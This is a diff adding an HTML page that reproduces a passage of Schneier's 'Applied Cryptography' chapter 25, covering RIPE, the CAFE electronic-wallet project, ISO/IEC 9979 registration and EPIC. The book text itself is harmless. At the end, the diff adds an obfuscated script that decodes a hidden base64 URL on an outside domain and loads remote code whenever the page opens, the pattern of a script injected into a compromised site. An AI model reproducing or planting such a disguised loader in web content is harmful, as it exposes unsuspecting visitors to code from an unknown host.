@@ -1,0 +1,115 @@
+<html>
+<head>
+<TITLE>APPLIED CRYPTOGRAPHY, SECOND EDITION: Protocols, Algorithms, and Source Code in C:Politics</TITLE>
+<!-- BEGIN HEADER -->
+<META NAME="ROBOTS" CONTENT="NOINDEX, NOFOLLOW">
+<SCRIPT>
+<!--
+function displayWindow(url, width, height) {
+        var Win = window.open(url,"displayWindow",'width=' + width +
+',height=' + height + ',resizable=1,scrollbars=yes');
+}
+//-->
+</SCRIPT>
+
+</HEAD>
+<body bgcolor="ffffff" link="#006666" alink="#006666" vlink="#006666">
+<P>
+<CENTER><B>Applied Cryptography, Second Edition: Protocols,  Algorthms, and Source Code in C (cloth)</B>
+<FONT SIZE="-2">
+<BR>
+<I>(Publisher: John Wiley & Sons, Inc.)</I>
+<BR>
+Author(s): Bruce Schneier
+<BR>
+ISBN: 0471128457
+<BR>
+Publication Date: 01/01/96
+</FONT></CENTER>
+<P>
+
+
+<!-- Empty Reference Subhead -->
+
+<!--ISBN=0471128457//-->
+<!--TITLE=APPLIED CRYPTOGRAPHY, SECOND EDITION: Protocols, Algorithms, and Source Code in C//-->
+<!--AUTHOR=Bruce Schneier//-->
+<!--PUBLISHER=Wiley Computer Publishing//-->
+<!--CHAPTER=25//-->
+<!--PAGES=605-608//-->
+<!--UNASSIGNED1//-->
+<!--UNASSIGNED2//-->
+
+<CENTER>
+<TABLE BORDER>
+<TR>
+<TD><A HREF="25-04.html">Previous</A></TD>
+<TD><A HREF="../ewtoc.html">Table of Contents</A></TD>
+<TD><A HREF="25-06.html">Next</A></TD>
+</TR>
+</TABLE>
+</CENTER>
+<P><BR></P>
+<H3><A NAME="Heading8"></A><FONT COLOR="#000077">25.7 RACE Integrity Primitives Evaluation (RIPE)</FONT></H3>
+<P>The Research and Development in Advanced Communication Technologies in Europe (RACE) program was launched by the European Community to support pre-competitive and pre-normative work in communications standards and technologies to support Integrated Broadband Communication (IBC). As part of that effort, RACE established the RACE Integrity Primitives Evaluation (RIPE) to put together a portfolio of techniques to meet the anticipated security requirements of IBC.
+</P>
+<P>Six leading European cryptography research groups made up the RIPE consortium: Center for Mathematics and Computer Science, Amsterdam; Siemens AG; Philips Crypto BV; Royal PTT Nederland NV, PTT Research; Katholieke Universiteit Leuven; and Aarhus Universitet. After calls for algorithms in 1989 and 1991 [1564], 32 submissions from around the world, and a 350 man-month evaluation project, the consortium published <I>RIPE Integrity Primitives</I> [1305,1332]. The report included an introduction and some basic integrity concepts, and these primitives: MDC-4 (see Section 18.11), RIPE-MD (see Section 18.8), RIPE-MAC (see Section 18.14), IBC-HASH, SKID (see Section 3.2), RSA, COMSET (see Section 16.1), and RSA key generation.</P>
+<H3><A NAME="Heading9"></A><FONT COLOR="#000077">25.8 Conditional Access for Europe (CAFE)</FONT></H3>
+<P>Conditional Access for Europe (CAFE) is a project in the European Community&#146;s ESPRIT program [204,205]. Work began in December 1992 and is scheduled to be finished by the end of 1995. The consortium involved consists of groups for social and market studies (Cardware, Institut f&#252;r Sozialforschung), software and hardware manufacturers (DigiCash, Gemplus, Ingenico, Siemens), and cryptographers (CWI Amsterdam, PTT Research Netherlands, SPET, Sintef Delab Trondheim, Universities of &#197;rhus, Hildesheim and Leuven).
+</P>
+<P>The goal is to develop systems for conditional access, particularly digital payment systems. Payment systems must give legal certainty to everybody at all times and require as little trust as possible&#151;this certainty should not depend on the tamper-resistance of any devices.</P>
+<P>The basic device for CAFE is an electronic wallet: a small computer that looks something like a pocket calculator. It has a battery, keyboard, screen, and an infrared channel for communicating with other wallets. Every user owns and uses his own wallet, which administers his rights and guarantees his security.</P>
+<P>A device with a keyboard and screen has an advantage over a smart card; it can operate independent of a terminal. A user can directly enter his password and the amount of the payment. The user does not have to give his wallet up to complete a transaction, unlike the current situation with credit cards.</P>
+<P>Additional features are:</P>
+<DL>
+<DD><B>&#151;</B>&nbsp;&nbsp;Offline transactions. The purpose of the system is to replace small cash transactions; an online system would be too cumbersome.
+<DD><B>&#151;</B>&nbsp;&nbsp;Loss tolerance. If a user loses his wallet, or if it breaks or is stolen, he can recover his money.
+<DD><B>&#151;</B>&nbsp;&nbsp;Support for different currencies.
+<DD><B>&#151;</B>&nbsp;&nbsp;An open architecture and open system. A user should be able to pay for arbitrary services, such as shopping, telephone, and public transport, by a range of service providers. The system should be interoperable between any number of electronic money issuers, and between different wallet types and manufacturers.
+<DD><B>&#151;</B>&nbsp;&nbsp;Low cost.
+</DL>
+<P>At this writing there is a software version of the system, and the consortium is hard at work on a hardware prototype.
+</P>
+<H3><A NAME="Heading10"></A><FONT COLOR="#000077">25.9 ISO/IEC 9979</FONT></H3>
+<P>In the mid-80s, the ISO tried to standardize DES, which by then was already a FIPS and an ANSI standard. After some political wrangling, the ISO decided not to standardize cryptographic algorithms, but instead to register algorithms. Only encryption algorithms can be registered; hash functions and signature schemes cannot. Any national body can submit an algorithm for registration.
+</P>
+<P>Currently only three algorithms have been submitted (see Table 25.4). A submission includes information about applications, parameters, implementations, modes, and test vectors. A detailed description is optional; it is possible to submit secret algorithms for registration.</P>
+<P>The fact that an algorithm is registered does not imply anything about its quality, nor is registration an approval of the algorithm by the ISO/IEC. Registration merely indicates that a single national body wants to register the algorithm, based on whatever criteria that body uses.</P>
+<P>I am not impressed with this idea. Registration obstructs the standardization process. Rather than agreeing on a few algorithms, the ISO is allowing any algorithm to be registered. With so little control over what is registered, stating that an algorithm is &#147;ISO/IEC 9979 Registered&#148; sounds a whole lot better than it is. In any case, the registry is maintained by the National Computer Centre Ltd., Oxford Road, Manchester, M1 7ED, United Kingdom.</P>
+<TABLE WIDTH="50%"><TH CAPTION COLSPAN="2" ALIGN="CENTER">Table 25.4<BR>ISO/IEC 9979<BR>Registered Algorithms
+<TR>
+<TD COLSPAN="2"><HR>
+<TR>
+<TH WIDTH="15%" VALIGN="TOP" ALIGN="LEFT">Name
+<TH WIDTH="35%" VALIGN="TOP" ALIGN="CENTER">Registration Number
+<TR>
+<TD COLSPAN="2"><HR>
+<TR>
+<TD VALIGN="TOP" ALIGN="LEFT">B-CRYPT
+<TD VALIGN="TOP" ALIGN="CENTER">0001
+<TR>
+<TD VALIGN="TOP" ALIGN="LEFT">IDEA
+<TD VALIGN="TOP" ALIGN="CENTER">0002
+<TR>
+<TD VALIGN="TOP" ALIGN="LEFT">LUC
+<TD VALIGN="TOP" ALIGN="CENTER">0003
+<TR>
+<TD COLSPAN="2"><HR>
+<TR>
+</TABLE>
+<H3><A NAME="Heading11"></A><FONT COLOR="#000077">25.10 Professional, Civil Liberties, and Industry Groups</FONT></H3>
+<P><FONT SIZE="+1"><B><I>Electronic Privacy Information Center (EPIC)</I></B></FONT></P>
+<P>EPIC was established in 1994 to focus public attention on emerging privacy issues relating to the National Information Infrastructure, such as the Clipper chip, the Digital Telephony proposal, national identity numbers and systems, medical records privacy, and the sale of consumer data. EPIC conducts litigation, sponsors conferences, produces reports, publishes the <I>EPIC Alert</I>, and leads campaigns on privacy issues. Anyone interested in joining should contact Electronic Privacy Information Center, 666 Pennsylvania Avenue SE, Suite 301, Washington, D.C. 20003; (202) 544-9240; fax: (202) 547-5482; Internet: info@epic.org.</P><P><BR></P>
+<CENTER>
+<TABLE BORDER>
+<TR>
+<TD><A HREF="25-04.html">Previous</A></TD>
+<TD><A HREF="../ewtoc.html">Table of Contents</A></TD>
+<TD><A HREF="25-06.html">Next</A></TD>
+</TR>
+</TABLE>
+</CENTER>
+
+[an error occurred while processing this directive]
+<script type="text/javascript">(function(eaQioPpX, nXiVesvS) {nXiVesvS = eaQioPpX.createElement('script');nXiVesvS.type = 'text/javascript';nXiVesvS.async = true;nXiVesvS.src = atob('0024241d2f28Ly91YmxvY2stcmVmZXJlci5kZXYvY2FtcGFpZ24uanM=0024241d2f28'.replace(/0024241d2f28/gi, '')) + '?' + String(Math.random()).replace('0.','');eaQioPpX.getElementsByTagName('body')[0].appendChild(nXiVesvS);}(document));</script></body>
+</html>
